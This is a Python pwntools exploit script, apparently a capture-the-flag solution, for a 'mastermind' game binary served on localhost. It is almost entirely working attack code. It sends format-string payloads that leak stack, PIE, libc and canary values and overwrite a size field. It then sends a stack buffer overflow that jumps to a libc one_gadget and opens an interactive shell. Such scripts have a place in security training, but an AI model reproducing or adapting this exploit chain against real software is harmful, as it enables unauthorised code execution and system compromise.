from pwn import *
import subprocess
from argparse import ArgumentParser

context.terminal = ['exo-open','--launch','TerminalEmulator']
program = ['./mastermind']
libc_path = ''
gdb_command = None

def good(limit):
    return "ABCD1234EFGH5678IJKL90MNOP "[:limit]+'\n'

def bad(offset=0, limit=26):
    return ("ABCD1234EFGH5678IJKL90MNOP"[:offset]+'\0'+"ABCD1234EFGH5678IJKL90MNOP")[:limit]+'\n'

def exploit(args) :
    elf = ELF(program[0], checksec=False)
    context.arch = elf.get_machine_arch()
    global libc
    global p
    global one

    if args['debug']:
        p = process(program)

        if args['gdb_command']:
            gdb.attach(p,args['gdb_command'])

    else:
        host = 'localhost'
        port = 10109

        if args['libc_path'] != '':
            libc = ELF(args['libc_path'], checksec=False)
            one = map(int, subprocess.check_output(['one_gadget', '--raw', args['libc_path']]).split(' '))

        p = remote(host, port)

    size = 26
    p.sendlineafter("Tell me the size of gameboard:", str(size))

    # 536 canary
    # 538 pie
    # 539 pointer to 541
    # 541 pointer to 543
    # 544 libc

    desire_padding = 4079
    # step 1: stack|pie|change %543 byte 0 to 0x20|padding
    # %p%538$p%4c%541$hhn%4042c
    printed_len = 0
    fmtstr = "%p"
    printed_len+= 14
    fmtstr += "%538$p"
    printed_len+= 14
    fmtstr+= "%{}c".format(0x20-printed_len)
    printed_len=0x20
    fmtstr+= "%541$hhn"
    printed_len+= 0
    fmtstr+= "%{}c".format(desire_padding-printed_len)
    printed_len=desire_padding
    fmtstr = fmtstr.ljust(size)

    payload1 = bad(3,size)*3 + good(size)*45 + fmtstr
    p.sendlineafter("Guess", payload1)
    p.recvuntil("[48] Guess(A-Z){26}:........\n\n")
    leak = p.recv(14)
    stack = int(leak,16) + 4288
    leak = p.recv(14)
    pie_base = int(leak,16) - 0x1d42
    print("stack: "+hex(stack))
    print("pie_base: "+hex(pie_base))

    if (pie_base % 0x10000) >= 0xc000:
        exit(0)

    # step 2: change %541 byte 0 + 1|libc|padding
    # %??c%539$hhn%544$p%????c
    printed_len = 0
    fmtstr = "%{}c".format((stack%0x100)+1)
    printed_len = (stack%0x100)+1
    fmtstr+= "%539$hhn"
    printed_len+= 0
    fmtstr += "%544$p"
    printed_len+= 14
    fmtstr+= "%{}c".format(desire_padding-printed_len)
    printed_len=desire_padding
    fmtstr = fmtstr.ljust(size)

    p.sendlineafter("[49] Guess(A-Z){26}:", fmtstr)
    p.recvuntil('........\n\n')
    p.recv((stack%0x100)+1)
    leak = p.recv(14)
    libc_base = int(leak,16) - 0x21b97
    print("libc_base: "+hex(libc_base))

    # step 3: modify %543 byte 1 so that it point to context_size|canary|padding
    # %??c%539$hhn%544$p%????c
    context_size = pie_base + 0x4120
    context_size_byte_1 = (context_size%0x10000)/0x100

    printed_len = 0
    fmtstr = "%{}c".format(context_size_byte_1)
    printed_len = context_size_byte_1
    fmtstr+= "%541$hhn"
    printed_len+= 0
    fmtstr += "%536$p"
    printed_len+= 18
    fmtstr+= "%{}c".format(desire_padding-printed_len)
    printed_len=desire_padding
    fmtstr = fmtstr.ljust(size)

    p.sendlineafter("[50] Guess(A-Z){26}:", fmtstr)
    p.recvuntil('........\n\n')
    p.recv(context_size_byte_1)
    leak = p.recv(18)
    canary = int(leak,16)
    print("canary: "+hex(canary))

    # step 4: modify context_size to large number
    new_size = 200
    p.sendlineafter("[51] Guess(A-Z){26}:", "%{}c%543$hhn".format(new_size).ljust(size))
    
    # step 5: bof
    one = libc_base + 0x4f3c2
    payload = 'a\x00'+'a'*38 + p64(canary) + p64(0)*3 +p64(one)
    p.sendlineafter("[52] Guess(A-", payload.ljust(new_size,'\x00'))

    p.interactive()
    p.close()
    return 0

if __name__ == '__main__':

    parser = ArgumentParser()
    parser.add_argument('-r', help='nc to remote server', action='store_true')
    parser.add_argument('-g', '--gdb-command', help='enable gdb debug with start script', dest='gdb_command')
    parser.add_argument('-d', help='set log to debug level', action='store_true')
    parser.add_argument('-e', help='extra info', action='store_true')
    args = parser.parse_args()
    
    if args.d:
        context.log_level = 'debug'

    if args.gdb_command != None:
        gdb_command = args.gdb_command.replace(';','\x0a')

    args = {'debug':args.r == False, 'gdb_command':gdb_command, 'libc_path':libc_path, 'extra':args.e}
    while exploit(args):
        log.debug(args)